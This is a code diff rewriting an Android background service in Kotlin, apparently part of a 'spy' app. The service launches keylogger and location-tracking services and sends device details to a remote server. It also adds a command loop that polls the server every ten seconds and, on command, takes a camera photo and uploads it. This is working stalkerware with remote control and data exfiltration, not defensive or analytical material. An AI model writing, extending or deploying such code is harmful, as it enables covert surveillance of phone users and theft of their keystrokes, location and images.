@@ -1,199 +1,299 @@
-package com.gauravhanna.spy;
+package com.gauravhanna.spy
 
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.Service;
-import android.content.Context;
-import android.content.Intent;
-import android.content.IntentFilter;
-import android.os.BatteryManager;
-import android.os.Build;
-import android.os.IBinder;
-import android.util.Log;
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
+import android.os.BatteryManager
+import android.os.Build
+import android.os.IBinder
+import android.util.Log
+import androidx.core.app.NotificationCompat
+import okhttp3.*
+import org.json.JSONObject
+import java.io.IOException
+import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
 
-import androidx.core.app.NotificationCompat;
+class BackgroundService : Service() {
+    private companion object {
+        const val TAG = "BackgroundService"
+        const val CHANNEL_ID = "gauravhanna_spy_channel"
+        const val NOTIFICATION_ID = 123
+        const val BASE_URL = "https://gauravhanna-spy.onrender.com/api"
+        const val POLLING_INTERVAL_SECONDS = 10L
+    }
 
-import org.json.JSONObject;
+    private lateinit var client: OkHttpClient
+    private val commandExecutor = Executors.newSingleThreadScheduledExecutor()
 
-import java.io.IOException;
-
-import okhttp3.Call;
-import okhttp3.Callback;
-import okhttp3.MediaType;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
-
-public class BackgroundService extends Service {
-    private static final String CHANNEL_ID = "gauravhanna_spy_channel";
-    private static final int NOTIFICATION_ID = 123;
-    private static final String BASE_URL = "https://gauravhanna-spy.onrender.com/api"; // Update with your actual URL
-    private OkHttpClient client;
-
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        createNotificationChannel();
-        startForeground(NOTIFICATION_ID, getNotification());
-
+    override fun onCreate() {
+        super.onCreate()
+        
         // Initialize OkHttpClient
-        client = new OkHttpClient();
-
+        client = OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .build()
+        
+        createNotificationChannel()
+        startForeground(NOTIFICATION_ID, getNotification())
+        
         // Start data collectors
-        startService(new Intent(this, LocationService.class));
-        startService(new Intent(this, KeyloggerService.class));
-        // Start MediaProjectionService if needed (requires user consent)
+        startService(Intent(this, LocationService::class.java))
+        startService(Intent(this, KeyloggerService::class.java))
         
         // Report device info immediately on start
-        reportDeviceInfo();
+        reportDeviceInfo()
+        
+        // Start command polling
+        startCommandPolling()
     }
 
-    private void createNotificationChannel() {
+    private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
-                    "GauravHanna Spy Service",
-                    NotificationManager.IMPORTANCE_LOW);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
-            }
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "GauravHanna Spy Service",
+                NotificationManager.IMPORTANCE_LOW
+            )
+            val manager = getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(channel)
         }
     }
 
-    private Notification getNotification() {
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("GauravHanna Spy")
-                .setContentText("Monitoring active")
-                .setSmallIcon(android.R.drawable.ic_menu_view)
-                .build();
+    private fun getNotification(): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("GauravHanna Spy")
+            .setContentText("Monitoring active")
+            .setSmallIcon(android.R.drawable.ic_menu_view)
+            .build()
     }
 
-    private void reportDeviceInfo() {
-        String deviceId = getDeviceId(this);
-        if (deviceId == null) return;
+    private fun startCommandPolling() {
+        commandExecutor.scheduleAtFixedRate({
+            try {
+                val deviceId = getDeviceId(this)
+                if (deviceId != null && deviceId.isNotEmpty()) {
+                    getCommand(deviceId) { command ->
+                        if (command == "take_photo") {
+                            Log.d(TAG, "Received take_photo command")
+                            CameraHelper.takePhoto(this) { base64 ->
+                                if (base64 != null) {
+                                    sendPhoto(base64)
+                                } else {
+                                    Log.e(TAG, "Photo capture failed")
+                                }
+                            }
+                        }
+                    }
+                } else {
+                    Log.e(TAG, "Device ID is null or empty")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in command polling", e)
+            }
+        }, 0, POLLING_INTERVAL_SECONDS, TimeUnit.SECONDS)
+    }
+
+    private fun getCommand(deviceId: String, callback: (String?) -> Unit) {
+        val request = Request.Builder()
+            .url("$BASE_URL/command/$deviceId")
+            .get()
+            .build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "Failed to get command", e)
+                callback(null)
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+                response.use {
+                    if (response.isSuccessful) {
+                        val body = response.body?.string()
+                        try {
+                            val json = JSONObject(body ?: "{}")
+                            val command = json.optString("command", null)
+                            callback(command)
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Error parsing command response", e)
+                            callback(null)
+                        }
+                    } else {
+                        Log.e(TAG, "Server error: ${response.code}")
+                        callback(null)
+                    }
+                }
+            }
+        })
+    }
+
+    private fun sendPhoto(base64Image: String) {
+        val deviceId = getDeviceId(this) ?: return
         
-        String deviceName = Build.MODEL;
-        String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
-        String androidVersion = Build.VERSION.RELEASE;
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("photo", base64Image)
+            put("timestamp", System.currentTimeMillis())
+        }
+
+        val body = RequestBody.create(
+            MediaType.parse("application/json"),
+            json.toString()
+        )
+
+        val request = Request.Builder()
+            .url("$BASE_URL/photo")
+            .post(body)
+            .build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "Failed to send photo", e)
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+                response.use {
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Photo sent successfully")
+                    } else {
+                        Log.e(TAG, "Failed to send photo: ${response.code}")
+                    }
+                }
+            }
+        })
+    }
+
+    private fun reportDeviceInfo() {
+        val deviceId = getDeviceId(this) ?: return
+        
+        val deviceName = Build.MODEL
+        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
+        val androidVersion = Build.VERSION.RELEASE
         
         // Get battery level
-        float batteryPct = 0;
-        try {
-            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-            Intent batteryStatus = registerReceiver(null, ifilter);
-            if (batteryStatus != null) {
-                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-                if (level != -1 && scale != -1) {
-                    batteryPct = level / (float) scale * 100;
-                }
-            }
-        } catch (Exception e) {
-            Log.e("BackgroundService", "Error getting battery info", e);
-        }
+        val batteryPct = getBatteryLevel()
         
-        String networkStatus = isOnline(this) ? "online" : "offline";
+        val networkStatus = if (isOnline(this)) "online" else "offline"
 
-        JSONObject json = new JSONObject();
-        try {
-            json.put("deviceId", deviceId);
-            json.put("deviceName", deviceName);
-            json.put("deviceModel", deviceModel);
-            json.put("androidVersion", androidVersion);
-            json.put("battery", batteryPct);
-            json.put("networkStatus", networkStatus);
-        } catch (Exception e) {
-            Log.e("BackgroundService", "Error creating JSON", e);
-            return;
+        val json = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("deviceName", deviceName)
+            put("deviceModel", deviceModel)
+            put("androidVersion", androidVersion)
+            put("battery", batteryPct)
+            put("networkStatus", networkStatus)
         }
 
-        // Send to server via /api/client/device-info
-        RequestBody body = RequestBody.create(
-            MediaType.parse("application/json"), 
+        val body = RequestBody.create(
+            MediaType.parse("application/json"),
             json.toString()
-        );
+        )
         
-        Request request = new Request.Builder()
-                .url(BASE_URL + "/device-info")
-                .post(body)
-                .build();
+        val request = Request.Builder()
+            .url("$BASE_URL/device-info")
+            .post(body)
+            .build()
         
-        client.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {
-                Log.e("BackgroundService", "Failed to send device info", e);
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "Failed to send device info", e)
             }
 
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    Log.d("BackgroundService", "Device info sent successfully");
-                } else {
-                    Log.e("BackgroundService", "Server error: " + response.code());
+            override fun onResponse(call: Call, response: Response) {
+                response.use {
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Device info sent successfully")
+                    } else {
+                        Log.e(TAG, "Server error: ${response.code}")
+                    }
                 }
-                response.close();
             }
-        });
+        })
     }
 
-    private String getDeviceId(Context context) {
-        // Implement your device ID logic here
-        // For Android 10+, you need to handle permissions properly
+    private fun getBatteryLevel(): Float {
+        return try {
+            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+            val batteryStatus = registerReceiver(null, ifilter)
+            if (batteryStatus != null) {
+                val level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
+                val scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
+                if (level != -1 && scale != -1) {
+                    level / scale.toFloat() * 100
+                } else {
+                    0f
+                }
+            } else {
+                0f
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting battery info", e)
+            0f
+        }
+    }
+
+    private fun getDeviceId(context: Context): String? {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // For Android 10+, use Android ID
+                android.provider.Settings.Secure.getString(
+                    context.contentResolver,
+                    android.provider.Settings.Secure.ANDROID_ID
+                )
+            } else {
+                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+                try {
+                    tm.deviceId
+                } catch (e: SecurityException) {
+                    Log.e(TAG, "Permission denied for getDeviceId", e)
+                    android.provider.Settings.Secure.getString(
+                        context.contentResolver,
+                        android.provider.Settings.Secure.ANDROID_ID
+                    )
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting device ID", e)
+            android.provider.Settings.Secure.getString(
+                context.contentResolver,
+                android.provider.Settings.Secure.ANDROID_ID
+            )
+        }
+    }
+
+    private fun isOnline(context: Context): Boolean {
+        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+        val activeNetwork = cm.activeNetworkInfo
+        return activeNetwork != null && activeNetwork.isConnectedOrConnecting
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Schedule periodic data collection
+        DataCollector.scheduleDataCollection(this)
+        return START_STICKY
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        commandExecutor.shutdown()
         try {
-            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) 
-                    context.getSystemService(Context.TELEPHONY_SERVICE);
-            if (tm != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    // For Android 10+, use something else or request READ_PRIVILEGED_PHONE_STATE
-                    return android.provider.Settings.Secure.getString(
-                            context.getContentResolver(),
-                            android.provider.Settings.Secure.ANDROID_ID);
-                } else {
-                    return tm.getDeviceId();
-                }
+            if (!commandExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
+                commandExecutor.shutdownNow()
             }
-        } catch (SecurityException e) {
-            Log.e("BackgroundService", "Permission denied for getDeviceId", e);
+        } catch (e: InterruptedException) {
+            commandExecutor.shutdownNow()
         }
-        // Fallback to Android ID
-        return android.provider.Settings.Secure.getString(
-                context.getContentResolver(),
-                android.provider.Settings.Secure.ANDROID_ID);
-    }
-
-    private boolean isOnline(Context context) {
-        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
-                context.getSystemService(Context.CONNECTIVITY_SERVICE);
-        if (cm != null) {
-            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
-        }
-        return false;
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        // Start data collection tasks (could use WorkManager)
-        DataCollector.scheduleDataCollection(this);
         
-        // Report device info periodically (optional)
-        // You can use Handler or WorkManager for periodic reporting
-        
-        return START_STICKY;
-    }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        if (client != null) {
-            client.dispatcher().executorService().shutdown();
+        if (::client.isInitialized) {
+            client.dispatcher().executorService().shutdown()
         }
     }
 
-    @Override
-    public IBinder onBind(Intent intent) { 
-        return null; 
-    }
+    override fun onBind(intent: Intent): IBinder? = null
 }
